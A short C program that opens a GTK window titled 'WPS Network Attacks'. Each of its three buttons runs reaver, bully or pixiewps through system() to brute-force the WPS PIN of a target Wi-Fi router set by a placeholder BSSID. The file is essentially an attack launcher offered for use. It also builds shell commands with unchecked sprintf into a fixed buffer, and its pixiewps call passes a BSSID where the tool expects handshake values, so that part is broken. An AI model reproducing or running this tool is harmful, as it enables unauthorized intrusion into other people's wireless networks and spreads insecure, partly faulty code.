#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <gtk/gtk.h>

void reaver_attack(GtkWidget *widget, gpointer data) {
    const char* bssid = (const char*)data;
    char command[100];
    sprintf(command, "reaver -i wlan0 -b %s -vv", bssid);
    system(command);
}

void bully_attack(GtkWidget *widget, gpointer data) {
    const char* bssid = (const char*)data;
    char command[100];
    sprintf(command, "bully -b %s -c 1 wlan0", bssid);
    system(command);
}

void pixiewps_attack(GtkWidget *widget, gpointer data) {
    const char* bssid = (const char*)data;
    char command[100];
    sprintf(command, "pixiewps -e -s %s", bssid);
    system(command);
}

int main(int argc, char *argv[]) {
    // Initialize GTK
    gtk_init(&argc, &argv);

    // Create the main window
    GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title(GTK_WINDOW(window), "WPS Network Attacks");
    gtk_window_set_default_size(GTK_WINDOW(window), 300, 200);
    g_signal_connect(window, "destroy", G_CALLBACK(gtk_main_quit), NULL);

    // Create a vertical box layout
    GtkWidget *vbox = gtk_box_new(GTK_ORIENTATION_VERTICAL, 10);
    gtk_container_add(GTK_CONTAINER(window), vbox);

    // Create buttons for different attacks
    const char* bssid = "11:22:33:44:55:66"; // Replace with the target BSSID
    GtkWidget *reaverButton = gtk_button_new_with_label("Reaver Attack");
    g_signal_connect(reaverButton, "clicked", G_CALLBACK(reaver_attack), (gpointer)bssid);
    gtk_box_pack_start(GTK_BOX(vbox), reaverButton, TRUE, TRUE, 0);

    GtkWidget *bullyButton = gtk_button_new_with_label("Bully Attack");
    g_signal_connect(bullyButton, "clicked", G_CALLBACK(bully_attack), (gpointer)bssid);
    gtk_box_pack_start(GTK_BOX(vbox), bullyButton, TRUE, TRUE, 0);

    GtkWidget *pixiewpsButton = gtk_button_new_with_label("Pixiewps Attack");
    g_signal_connect(pixiewpsButton, "clicked", G_CALLBACK(pixiewps_attack), (gpointer)bssid);
    gtk_box_pack_start(GTK_BOX(vbox), pixiewpsButton, TRUE, TRUE, 0);

    // Show all widgets and start the main loop
    gtk_widget_show_all(window);
    gtk_main();

    return 0;
}
